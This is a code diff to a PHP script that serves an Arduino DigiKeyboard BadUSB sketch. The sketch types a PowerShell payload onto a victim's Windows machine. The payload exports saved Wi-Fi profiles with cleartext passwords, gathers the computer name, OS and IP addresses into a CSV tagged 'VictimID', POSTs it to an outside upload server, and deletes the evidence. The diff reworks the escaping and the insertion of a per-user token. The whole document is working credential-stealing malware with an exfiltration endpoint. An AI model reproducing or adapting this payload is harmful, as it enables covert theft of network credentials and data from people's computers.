@@ -8,9 +8,9 @@ if (empty($token)) {
     exit('Access Denied: Missing token.');
 }
 
-$escaped_token = htmlspecialchars($token, ENT_QUOTES, 'UTF-8');
+$safe = addslashes($token);
 
-$sketch = <<<ARDUINO
+$sketch = <<<'ARDUINO'
 #include "DigiKeyboard.h"
 
 #define KEY_R 0x15
@@ -34,42 +34,42 @@ void loop() {
   // Wi-Fi grab + victim ID + LAN IP + location + CSV + POST + cleanup + exit
   DigiKeyboard.print(
     F(
-      "\$u='https://narain.udhees.com/upload.php?token={$escaped_token}';"
-      "\$t=\$env:TEMP;"
-      "netsh wlan export profile folder=\\\"\\$t\\\" key=clear > \\$null;"
-      "\$os=(Get-CimInstance Win32_OperatingSystem).Caption;"
-      "\$victimId=\$env:COMPUTERNAME;"
-      "try{\$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 3).Content.Trim()}catch{\$pub='(unknown)'};"
-      "\$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;"
-      "if(\$defaultRoute){\$ifIndex=\$defaultRoute.InterfaceIndex;\$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex \$ifIndex -ErrorAction SilentlyContinue|Where-Object{ \$_.IPAddress -notlike '169.254*' -and \$_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{\$lanObj=\\$null};"
-      "if(\$lanObj){\$lan=\$lanObj.IPAddress}else{\$lan='(unknown)'};"
-      "\$alt='N/A';\$lat='N/A';\$lon='N/A';"
-      "\$ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss');"
-      "\$items=@();"
-      "Get-ChildItem \\\"\\$t\\\\Wi-Fi-*.xml\\\"|ForEach-Object{"
-        "\$x=[xml](Get-Content \$_.FullName);"
-        "\$s=\$x.WLANProfile.SSIDConfig.SSID.name;"
-        "\$p=\$x.WLANProfile.MSM.security.sharedKey.keyMaterial;"
-        "\$items+=[pscustomobject]@{"
-          "Time=\$ts;"
-          "VictimID=\$victimId;"
-          "SSID=\$s;"
-          "Password=if(\$p){\$p}else{''};"
-          "VictimLANIP=\$lan;"
-          "VictimOS=\$os;"
-          "PublicIP=\$pub;"
-          "LANExtra=\$alt;"
-          "Latitude=\$lat;"
-          "Longitude=\$lon;"
+      "$u='https://narain.udhees.com/upload.php?token=__TOKEN__';"
+      "$t=$env:TEMP;"
+      "netsh wlan export profile folder=\"$t\" key=clear > $null;"
+      "$os=(Get-CimInstance Win32_OperatingSystem).Caption;"
+      "$victimId=$env:COMPUTERNAME;"
+      "try{$pub=(Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 3).Content.Trim()}catch{$pub='(unknown)'};"
+      "$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;"
+      "if($defaultRoute){$ifIndex=$defaultRoute.InterfaceIndex;$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue|Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{$lanObj=$null};"
+      "if($lanObj){$lan=$lanObj.IPAddress}else{$lan='(unknown)'};"
+      "$alt='N/A';$lat='N/A';$lon='N/A';"
+      "$ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss');"
+      "$items=@();"
+      "Get-ChildItem \"$t\\Wi-Fi-*.xml\"|ForEach-Object{"
+        "$x=[xml](Get-Content $_.FullName);"
+        "$s=$x.WLANProfile.SSIDConfig.SSID.name;"
+        "$p=$x.WLANProfile.MSM.security.sharedKey.keyMaterial;"
+        "$items+=[pscustomobject]@{"
+          "Time=$ts;"
+          "VictimID=$victimId;"
+          "SSID=$s;"
+          "Password=if($p){$p}else{''};"
+          "VictimLANIP=$lan;"
+          "VictimOS=$os;"
+          "PublicIP=$pub;"
+          "LANExtra=$alt;"
+          "Latitude=$lat;"
+          "Longitude=$lon;"
           "PacketSummary=''"
         "};"
-        "Remove-Item \$_.FullName -ErrorAction SilentlyContinue"
+        "Remove-Item $_.FullName -ErrorAction SilentlyContinue"
       "};"
-      "if(\$items){"
-        "\$csv=\\\"\\$t\\\\w.csv\\\";"
-        "\$items|Export-Csv \$csv -NoTypeInformation;"
-        "Invoke-WebRequest -UseBasicParsing -Uri \$u -Method Post -Body (Get-Content \$csv -Raw);"
-        "Remove-Item \$csv -ErrorAction SilentlyContinue;"
+      "if($items){"
+        "$csv=\"$t\\w.csv\";"
+        "$items|Export-Csv $csv -NoTypeInformation;"
+        "Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw);"
+        "Remove-Item $csv -ErrorAction SilentlyContinue;"
       "};"
       "exit;"
     )
@@ -86,6 +86,8 @@ void loop() {
   }
 }
 ARDUINO;
+
+$sketch = str_replace('__TOKEN__', $safe, $sketch);
 
 header('Content-Type: text/plain; charset=utf-8');
 echo $sketch;
